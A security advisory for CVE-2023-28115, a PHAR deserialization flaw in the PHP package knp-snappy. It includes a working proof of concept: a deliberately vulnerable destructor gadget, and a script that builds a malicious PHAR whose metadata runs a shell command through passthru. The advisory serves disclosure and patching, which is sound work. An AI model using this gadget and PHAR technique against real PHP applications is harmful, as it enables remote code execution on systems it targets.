# [C] PHAR deserialization allowing remote code execution

## Summary
Severity: Critical
Advisory: GHSA-gq6w-q6wh-jggc
CVE: CVE-2023-28115
CWE: CWE-502
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2023-03-17
Source: https://github.com/advisories/GHSA-gq6w-q6wh-jggc
Type: github-advisory

## Affected
- Packagist: `knplabs/knp-snappy` — affected >=0 <1.4.2

## Details
## Description

snappy is vulnerable to PHAR deserialization due to a lack of checking on the protocol before passing it into the `file_exists()` function. If an attacker can upload files of any type to the server he can pass in the phar:// protocol to unserialize the uploaded file and instantiate arbitrary PHP objects. This can lead to remote code execution especially when snappy is used with frameworks with documented POP chains like Laravel/Symfony vulnerable developer code. If user can control the output file from the `generateFromHtml()` function, it will invoke deserialization.

## Proof of Concept

Install Snappy via composer require `knplabs/knp-snappy`. After that, under snappy directory, create an `index.php` file with this vulnerable code.

```php
<?php
// index.php

// include autoloader
require __DIR__ . '/vendor/autoload.php';

// reference the snappy namespace
use Knp\Snappy\Pdf;

// vulnerable object
class VulnerableClass {
    public $fileName;
    public $callback;

    function __destruct() {
        call_user_func($this->callback, $this->fileName);
    }
}

$snappy = new Pdf('/usr/local/bin/wkhtmltopdf');
// generate pdf from html content and save it at phar://poc.phar
$snappy->generateFromHtml('<h1>Bill</h1><p>You owe me money, dude.</p>', 'phar://poc.phar');
```

As an attacker, we going to generate the malicious phar using this script.

```php
<?php
// generate_phar.php

class VulnerableClass { }
// Create a new instance of the Dummy class and modify its property
$dummy = new VulnerableClass();
$dummy->callback = "passthru";
$dummy->fileName = "uname -a > pwned"; //our payload

// Delete any existing PHAR archive with that name
@unlink("poc.phar");

// Create a new archive
$poc = new Phar("poc.phar");

// Add all write operations to a buffer, without modifying the archive on disk
$poc->startBuffering();

// Set the stub
$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

// Add a new file in the archive with "text" as its content
$poc["file"] = "text";

// Add the dummy object to the metadata. This will be serialized
$poc->setMetadata($dummy);

// Stop buffering and write changes to disk
$poc->stopBuffering();
?>
```

Then run these command to generate the file

```php
php --define phar.readonly=0 generate_phar.php
```

Then execute index.php with `php index.php`. You will see a file named `pwned` will be created. Noted that attacker can upload a file with any extension such as .png or .jpeg. So poc.jpeg also will do the trick.

## Impact

This vulnerability is capable of remote code execution if Snappy is used with frameworks or developer code with vulnerable POP chains.

## Occurences

<https://github.com/KnpLabs/snappy/blob/5126fb5b335ec929a226314d40cd8dad497c3d67/src/Knp/Snappy/AbstractGenerator.php#L670>

## References

- <https://huntr.dev/bounties/0bdddc12-ff67-4815-ab9f-6011a974f48e/>

## References
- https://github.com/KnpLabs/snappy/security/advisories/GHSA-gq6w-q6wh-jggc
- https://nvd.nist.gov/vuln/detail/CVE-2023-28115
- https://github.com/KnpLabs/snappy/pull/469
- https://github.com/KnpLabs/snappy/commit/1ee6360cbdbea5d09705909a150df7963a88efd6
- https://github.com/KnpLabs/snappy/commit/b66f79334421c26d9c244427963fa2d92980b5d3
- https://github.com/FriendsOfPHP/security-advisories/blob/master/knplabs/knp-snappy/CVE-2023-28115.yaml
- https://github.com/KnpLabs/snappy
- https://github.com/KnpLabs/snappy/blob/5126fb5b335ec929a226314d40cd8dad497c3d67/src/Knp/Snappy/AbstractGenerator.php#L670
- https://github.com/KnpLabs/snappy/releases/tag/v1.4.2
- https://github.com/advisories/GHSA-gq6w-q6wh-jggc
- https://huntr.dev/bounties/0bdddc12-ff67-4815-ab9f-6011a974f48e
